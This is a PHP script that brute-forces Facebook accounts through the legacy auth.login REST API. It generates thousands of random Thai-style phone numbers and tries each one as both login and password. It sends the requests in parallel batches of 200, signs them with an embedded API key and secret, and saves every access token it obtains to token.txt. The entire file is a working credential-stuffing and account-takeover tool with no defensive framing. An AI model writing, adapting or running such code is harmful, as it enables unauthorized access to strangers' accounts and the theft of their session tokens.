<?php
	error_reporting(0);
	$bigArray = array();
	$myurl = array();
	function get_sig($email,$password){		
		$data['api_key'] = '882a8490361da98702bf97a021ddc14d';
		$data['method'] = "auth.login";
		$data['credentials_type'] = 'password';
		$data['email'] = $email;
		$data['password'] = $password;
		$data['format'] = "JSON";
		$data['v'] = '1.0';				
		ksort($data);					
		$args = '';									
		foreach ($data as $key => $value){
			$args .= $key.'='.$value;
		}
		
		$data['sig'] = md5($args.'62f8ce9f74b12f84c123cc23437a4a32');
		return $data["sig"];
	}
	function get2phone(){
		$number[1] = array("06", "08", "09");
		$number[2] = $number[1][array_rand($number[1])];
		$number[3] = $number[2].substr(str_shuffle("0123456789"),0,8);
		return $number[3];
	}
	function get3phone(){
		$number[1] = array("060", "061", "062", "063", "064", "065", "066", "067", "068", "069", "080", "081", "082", "083", "084", "085", "086", "087", "088", "089", "090", "091", "092", "093", "094", "095", "096", "097", "098", "099");
		$number[2] = $number[1][array_rand($number[1])];
		$number[3] = $number[2].substr(str_shuffle("0123456789"),0,7);
		return $number[3];
	}
	function get4phone(){
		$number[1] = array("0800", "0801", "0802", "0803", "0804", "0805", "0806", "AIS", "0807", "0808", "0809", "0810", "0811", "", "0812", "0813", "0814", "0815", "0816", "0817", "0818", "0819", "0871", "0872", "0873", "0874", "0875", "0876");
		$number[2] = $number[1][array_rand($number[1])];
		$number[3] = $number[2].substr(str_shuffle("0123456789"),0,6);
		return $number[3];
	}
	
	

	for ($x = 0; $x <= 5000;$x++){
		
		$a=array(get2phone(),get3phone(),get4phone());
		$random_keys=array_rand($a,3);
		$phone = $a[$random_keys[0]];
		
		$bigArray = 'https://api.facebook.com/restserver.php?api_key=882a8490361da98702bf97a021ddc14d&credentials_type=password&email='.urlencode($phone).'&format=JSON&method=auth.login&password='.urlencode($phone).'&v=1.0&sig='.get_sig($phone,$phone);
		array_push($myurl,$bigArray);
	}
	require("RollingCurl.php");
	$rc = new RollingCurl("request_callback");
	$rc->window_size = 200;
	
	foreach ($myurl as $url) {
		$request = new RollingCurlRequest($url);
		$rc->add($request);
		flush();
	}
	$rc->execute();
	
	function request_callback($response, $info) {
		global $id;
		$token = json_decode($response, true);
		
		if($token['access_token'] != ""){
			$Fopen = fopen("token.txt", 'a');
			fwrite($Fopen, "".$token['access_token']."\n");
			fclose($Fopen);
			echo "=====================================\n";
			echo "STATUS : SUCCESS\n";
			echo "TOKEN : ".$token['access_token']."\n";
			echo "=====================================\n";
			}else{
			if($token['error_msg'] == 'Calls to this api have exceeded the rate limit. (613)'){
				echo "=====================================\n";
				}else{
				echo "=====================================\n";
				echo "STATUS : ERROR\n";
				echo "PHONE : ".$token['request_args'][2]['value']." ";
				echo "MSG : ".$token['error_msg']."\n";
				echo "=====================================\n";
			}
		}
	}
?>